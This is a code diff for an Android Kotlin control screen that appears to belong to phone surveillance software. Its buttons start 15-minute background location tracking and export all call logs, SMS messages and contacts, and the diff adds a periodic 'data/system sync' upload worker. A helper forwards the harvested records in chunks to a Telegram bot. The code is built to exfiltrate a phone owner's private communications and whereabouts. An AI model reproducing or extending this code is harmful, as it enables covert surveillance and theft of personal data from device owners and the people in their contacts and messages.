@@ -80,12 +80,9 @@ fun ControlPanelScreen(
     ) {
         Text("Status: $statusMessage", fontWeight = FontWeight.Bold)
         Spacer(modifier = Modifier.height(16.dp))
-        Divider()
-        Spacer(modifier = Modifier.height(16.dp))
 
-        // --- LOCATION TRACKING CONTROLS ---
-        Text("Location Tracking (WorkManager)", fontSize = 18.sp, fontWeight = FontWeight.Bold)
-        Spacer(modifier = Modifier.height(16.dp))
+        // --- BACKGROUND WORKERS SECTION ---
+        SectionHeader(title = "Background Workers")
 
         Button(onClick = {
             permissionManager.requestPermission(Manifest.permission.ACCESS_FINE_LOCATION) {
@@ -102,18 +99,38 @@ fun ControlPanelScreen(
                 }
             }
         }) {
-            Text("Start Periodic Tracking (15 min)")
+            Text("Start Periodic Location (15 min)")
         }
         Spacer(modifier = Modifier.height(8.dp))
-
         Button(onClick = {
             workManager.cancelUniqueWork(LocationWorker.UNIQUE_WORK_NAME)
             statusMessage = "Periodic location tracking stopped."
             Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
         }) {
-            Text("Stop Periodic Tracking")
+            Text("Stop Periodic Location")
+        }
+        Spacer(modifier = Modifier.height(16.dp))
+
+        // FIXED: Added button to schedule the DataUploadWorker
+        Button(onClick = {
+            scheduleDataUploadWorker(workManager)
+            statusMessage = "Periodic data/system sync started."
+            Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
+        }) {
+            Text("Start Periodic Data Sync (15 min)")
         }
         Spacer(modifier = Modifier.height(8.dp))
+        Button(onClick = {
+            workManager.cancelUniqueWork("DataUploadWorker")
+            statusMessage = "Periodic data sync stopped."
+            Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
+        }) {
+            Text("Stop Periodic Data Sync")
+        }
+
+
+        // --- MANUAL ACTIONS SECTION ---
+        SectionHeader(title = "Manual Actions")
 
         Button(onClick = {
             statusMessage = "Requesting one-time location..."
@@ -128,14 +145,7 @@ fun ControlPanelScreen(
         }) {
             Text("Send Location Now")
         }
-        Spacer(modifier = Modifier.height(24.dp))
-        Divider()
         Spacer(modifier = Modifier.height(16.dp))
-
-        // --- MANUAL DATA EXPORT BUTTONS ---
-        Text("Manual Data Export", fontSize = 18.sp, fontWeight = FontWeight.Bold)
-        Spacer(modifier = Modifier.height(16.dp))
-
         Button(onClick = {
             permissionManager.requestPermission(Manifest.permission.READ_CALL_LOG) {
                 statusMessage = "Exporting all call logs..."
@@ -149,7 +159,6 @@ fun ControlPanelScreen(
             Text("Export All Call Logs")
         }
         Spacer(modifier = Modifier.height(16.dp))
-
         Button(onClick = {
             permissionManager.requestPermission(Manifest.permission.READ_SMS) {
                 statusMessage = "Exporting all SMS..."
@@ -163,7 +172,6 @@ fun ControlPanelScreen(
             Text("Export All SMS")
         }
         Spacer(modifier = Modifier.height(16.dp))
-
         Button(onClick = {
             permissionManager.requestPermission(Manifest.permission.READ_CONTACTS) {
                 statusMessage = "Exporting all contacts..."
@@ -179,34 +187,45 @@ fun ControlPanelScreen(
     }
 }
 
+@Composable
+private fun SectionHeader(title: String) {
+    Spacer(modifier = Modifier.height(16.dp))
+    Divider()
+    Spacer(modifier = Modifier.height(16.dp))
+    Text(title, fontSize = 18.sp, fontWeight = FontWeight.Bold)
+    Spacer(modifier = Modifier.height(16.dp))
+}
+
 private fun schedulePeriodicLocationWorker(workManager: WorkManager) {
-    val constraints = Constraints.Builder()
-        .setRequiredNetworkType(NetworkType.CONNECTED)
-        .build()
-
+    val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
     val periodicWorkRequest = PeriodicWorkRequestBuilder<LocationWorker>(15, TimeUnit.MINUTES)
-        .setConstraints(constraints)
-        .build()
-
+        .setConstraints(constraints).build()
     workManager.enqueueUniquePeriodicWork(
-        LocationWorker.UNIQUE_WORK_NAME,
+        LocationWorker.UNIQUE_WORK_NAME, ExistingPeriodicWorkPolicy.KEEP, periodicWorkRequest
+    )
+}
+
+// Function to schedule the DataUploadWorker
+private fun scheduleDataUploadWorker(workManager: WorkManager) {
+    val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
+    val periodicWorkRequest = PeriodicWorkRequestBuilder<DataUploadWorker>(15, TimeUnit.MINUTES)
+        .setConstraints(constraints).build()
+    workManager.enqueueUniquePeriodicWork(
+        "DataUploadWorker", // This name should match what you want to use for cancellation
         ExistingPeriodicWorkPolicy.KEEP,
         periodicWorkRequest
     )
 }
 
-// Simplified permission request extension
 fun PermissionManager.requestPermission(permission: String, onGranted: () -> Unit) {
-    this.requestPermission(permission, onGranted) { /* Handle denial if needed, empty for now */ }
+    this.requestPermission(permission, onGranted) { /* Handle denial if needed */ }
 }
 
-// Helper function to send large amounts of data in chunks to avoid API limits
 private suspend fun sendDataInChunks(data: List<String>, title: String, api: TelegramBotApi) {
     if (data.isEmpty()) {
         api.sendMessage("$title: No data found.")
         return
     }
-
     val chunkSize = 20 // Number of records per Telegram message
     data.chunked(chunkSize).forEachIndexed { index, chunk ->
         val messageBuilder = StringBuilder()
